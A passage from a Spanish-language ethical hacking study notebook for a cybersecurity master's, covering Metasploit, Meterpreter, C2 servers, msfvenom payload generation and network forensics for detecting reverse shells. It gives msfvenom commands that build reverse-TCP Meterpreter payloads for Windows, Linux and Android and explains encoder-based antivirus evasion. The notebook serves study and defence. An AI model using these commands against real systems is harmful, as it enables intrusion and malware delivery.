| **Post-exploitation** | Módulos para persistencia, escalada de privilegios, pivoting y exfiltración tras el compromiso |

Metasploit incluye tanto CLI (`msfconsole`) como una interfaz gráfica llamada **Armitage**. Su carácter modular y extensible permite a la comunidad contribuir constantemente con nuevos exploits y módulos.

### Meterpreter

**Meterpreter** es el payload más sofisticado dentro del ecosistema Metasploit. A diferencia de una simple reverse shell que ofrece acceso a una línea de comandos, Meterpreter es un agente completo que opera **íntegramente en memoria** del proceso explotado, sin escribir nada en disco, lo que dificulta enormemente su detección forense.

Sus capacidades van mucho más allá de una shell estándar:

- **Shell interactiva** — ejecución de comandos en el sistema comprometido como si se estuviera físicamente en la máquina
- **Acceso profundo al sistema operativo** — enumeración de procesos, manipulación de servicios, capturas de pantalla, acceso al portapapeles, manipulación del registro de Windows
- **Post-explotación integrada** — módulos para escalada de privilegios (`getsystem`), dump de credenciales (`hashdump`), pivoting a otras redes y ejecución de scripts personalizados
- **Persistencia** — mecanismos para mantenerse activo tras reinicios del sistema comprometido
- **Canal cifrado** — todo el tráfico entre el atacante y el sistema comprometido va cifrado, dificultando la detección por análisis de tráfico

### Servidores C2 (Command and Control)

Un **servidor C2** es un punto centralizado de gestión y control para múltiples dispositivos comprometidos simultáneamente. Cuando un atacante compromete decenas o miles de sistemas, no puede gestionarlos manualmente uno a uno — el C2 automatiza y centraliza este control.

El ciclo de funcionamiento de un C2 es siempre el mismo: el malware instalado en la víctima contacta periódicamente con el servidor C2 para recibir instrucciones ("beacon"), ejecuta los comandos recibidos y envía de vuelta los resultados. Esta arquitectura permite al atacante:

- Enviar comandos (recopilación de datos, instalación de más malware, ataques a terceros)
- Recopilar datos exfiltrados de todas las víctimas
- Adaptar el comportamiento del malware en tiempo real
- Coordinar ataques distribuidos (DDoS, ransomware masivo)

Los atacantes sofisticados diseñan sus infraestructuras C2 para **ser resistentes y difíciles de detectar**:

| Tipo de infraestructura C2 | Ventaja para el atacante |
|:---|:---|
| **Cloud (AWS, Azure)** | El tráfico se mezcla con el de millones de usuarios legítimos de los mismos proveedores |
| **VPS distribuidos** | Múltiples nodos en diferentes geografías — eliminar uno no derriba toda la infraestructura |
| **Redes sociales** | Comandos codificados en mensajes directos o publicaciones — casi imposible de distinguir del tráfico normal |
| **Servicios legítimos** | Dropbox, Google Drive como canal — las organizaciones raramente bloquean estos servicios |

---

## ⚗️ 12 — Crear Malware con msfvenom

**msfvenom** es la herramienta de Metasploit dedicada a la generación de payloads. Combina en un solo comando la generación del payload y su codificación para evasión, y puede producir el resultado en docenas de formatos distintos —ejecutable Windows (.exe), binario Linux (ELF), APK de Android, shellcode raw, etc.

### Sintaxis

```bash
msfvenom -p <payload> LHOST=<IP_ATACANTE> LPORT=<PUERTO> -f <formato> -o <archivo_salida>
```

| Parámetro | Descripción |
|:---:|:---|
| `-p` | Payload a utilizar |
| `LHOST` | IP del atacante / servidor C2 que recibirá la conexión de vuelta |
| `LPORT` | Puerto en el que el atacante estará escuchando |
| `-f` | Formato del archivo de salida (exe, elf, apk, raw, python…) |
| `-o` | Ruta del archivo de salida |

### Payloads: Staged vs Stageless

La distinción entre payloads staged y stageless es fundamental para entender cómo Metasploit gestiona el tamaño y la flexibilidad de sus cargas útiles:

**Staged payloads** dividen la ejecución en dos fases. El **stager** es un fragmento de código pequeño y ligero que se ejecuta en la víctima — su único propósito es establecer la conexión con el servidor atacante y descargar la segunda parte, el **stage**, que es el payload completo (Meterpreter, shell, etc.). El stager pesa unos pocos cientos de bytes, lo que permite inyectarlo en situaciones donde el espacio disponible es limitado.

- Ejemplo: `windows/meterpreter/reverse_tcp` (la barra `/` indica que es staged)

**Stageless payloads** contienen todo el código necesario en un único fichero — no requieren descargar nada adicional en tiempo de ejecución. Son más pesados, pero más confiables en entornos donde el sistema comprometido podría no ser capaz de conectarse de vuelta al atacante para descargar el stage.

- Ejemplo: `windows/x64/meterpreter_reverse_tcp` (el guión bajo `_` indica stageless)

### Generación por plataforma

```bash
# Windows — ejecutable .exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Linux — binario ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf

# Android — APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> R > payload.apk
```

### Empaquetado y Ofuscación

Los antivirus modernos utilizan principalmente dos métodos de detección: **análisis estático por firma** (comparar el binario contra una base de datos de patrones conocidos de malware) y **análisis de comportamiento dinámico** (ejecutar el fichero en un sandbox y observar sus acciones). La ofuscación ataca el primer método.

msfvenom incluye **encoders** o codificadores que transforman la estructura del payload sin alterar su comportamiento:

- **`x86/shikata_ga_nai`** — el codificador polimórfico más utilizado. Cada vez que se genera el payload produce una versión estructuralmente diferente que realiza exactamente la misma función. Esto invalida las firmas estáticas basadas en patrones fijos.
- **`cmd/powershell_base64`** — codifica el payload en Base64 para su ejecución a través de PowerShell, útil para entornos Windows con controles sobre scripts

La opción `-i N` aplica N pasadas de codificación sucesivas, transformando el payload en capas. Sin embargo, es crucial entender que **la ofuscación por codificación no garantiza la indetectabilidad** — los motores antivirus modernos también detectan los propios encoders, y el análisis de comportamiento dinámico es inmune a la ofuscación estática.

---

## 🔬 13 — Análisis de Tráfico de Reverse Shells

### Introducción al Análisis Forense Digital

El **análisis forense digital** es el proceso disciplinado de identificar, preservar, analizar y presentar evidencias digitales de forma que sean admisibles en un contexto legal. Su objetivo fundamental es reconstruir la secuencia de eventos que llevó a un incidente de seguridad: qué ocurrió, cuándo, cómo y quién fue el responsable. A diferencia del pentesting, que es ofensivo, el análisis forense es defensivo y reactivo — se aplica después de que ha ocurrido o se sospecha que ha ocurrido un incidente.

### Forense en Sistemas vs. Forense de Red

El análisis forense puede aplicarse sobre dos superficies principales que se complementan entre sí:

El **forense en sistemas** (endpoint forensics) trabaja sobre el dispositivo comprometido: análisis del disco duro, volcado y análisis de memoria RAM, revisión de logs del sistema, registros de aplicaciones y artefactos del sistema operativo. Permite recuperar información borrada y reconstruir la actividad del atacante dentro del sistema, pero generalmente se realiza de forma reactiva tras el incidente.

El **forense de red** se enfoca en el tráfico que circula por la red, ya sea capturado en tiempo real o almacenado en registros históricos. Permite detectar actividad anómala a medida que ocurre y correlacionar comunicaciones entre múltiples sistemas. Sus limitaciones son la volatilidad de los datos — si no se captura activamente el tráfico, se pierde — y la creciente prevalencia del cifrado, que dificulta el análisis del contenido de las comunicaciones.

| Dimensión | Forense de sistemas | Forense de red |
|:---|:---:|:---:|
| **Alcance** | Granular (un dispositivo) | Global (el entorno completo) |
| **Capacidad de respuesta** | Reactivo | Puede ser proactivo |
| **Persistencia de los datos** | Alta — el disco no se borra solo | Baja — requiere captura activa |

### Análisis de Tráfico — Para qué sirve

El análisis forense del tráfico de red es el principal método para detectar comunicaciones maliciosas en una organización. Sus aplicaciones son múltiples:

- **Detección de intrusiones:** identificar conexiones sospechosas o accesos no autorizados observando anomalías en los patrones de tráfico habituales de la red
- **Análisis de malware:** las amenazas avanzadas comunican constantemente con sus C2 o exfiltran datos — estas comunicaciones dejan huellas características en el tráfico
- **Prevención de ataques futuros:** identificando las técnicas y herramientas usadas en un ataque previo se pueden desarrollar reglas de detección (Snort/Suricata) para detectar el mismo patrón en el futuro
- **Cumplimiento legal:** las evidencias de tráfico de red correctamente capturadas y preservadas son admisibles en procedimientos judiciales

### Tráfico Normal vs. Tráfico Malicioso

El primer paso en el análisis forense de tráfico es aprender a distinguir el comportamiento normal de la red del comportamiento anómalo. Sin una baseline del tráfico legítimo, no es posible identificar desviaciones:

| Dimensión | Tráfico Normal | Tráfico de Reverse Shell |
|:---|:---|:---|
| **Protocolos** | HTTP/S, DNS, SMB, FTP sobre puertos estándar | Puertos arbitrarios, protocolos atípicos o tunelización |
| **Dirección** | Cliente interno → Servidor externo (navegación, DNS) | Servidor comprometido → IP atacante exterior |
| **Volumen y ritmo** | Ráfagas variables, predecibles por tipo de actividad | Sesiones de bajo ancho de banda y larga duración |
| **Cifrado** | TLS estándar con certificados verificables | Cifrado no estándar o sin certificado válido |

### Características de una Reverse Shell en el Tráfico

El tráfico generado por una reverse shell activa tiene un conjunto de características identificables que lo diferencian del tráfico legítimo:

| Indicador | Descripción |
|:---|:---|
| **Conexión saliente inesperada** | Una máquina servidora que inicia conexiones salientes a IPs externas no conocidas es anómalo — los servidores habitualmente solo responden, no inician |
| **Puerto de destino no estándar** | El puerto 4444 es la firma por defecto de Metasploit. Otros puertos como 1234, 9001 o 8888 son habituales en reverse shells. Los puertos 80 y 443 también son usados para camuflarse como tráfico web |
| **Bajo ancho de banda con alta duración** | Una reverse shell activa transmite comandos cortos y respuestas cortas durante periodos prolongados — el patrón es opuesto al tráfico web normal (ráfagas cortas y frecuentes de bytes) |
| **Sesión de larga duración** | Una conexión TCP abierta hacia el exterior durante horas es altamente sospechosa — el atacante mantiene la sesión mientras tiene el control |
| **Técnicas de evasión** | Tunneling DNS (comandos encapsulados en consultas DNS), tunneling HTTP (shell sobre peticiones GET/POST normales), fragmentación de paquetes para evitar firmas de IDS |

> [!NOTE]
> Herramientas de análisis: **Wireshark** para análisis manual de paquetes capturados, **Zeek/Bro** para análisis de flujos de red, **Suricata** o **Snort** como IDS con reglas de detección de reverse shells conocidas.

---

<hr>
<p align="center">
  <i>
    Cuaderno de estudio del módulo de Hacking Ético — Máster en Ciberseguridad.<br>
    Documento vivo que crece con las prácticas del módulo.
  </i>
</p>
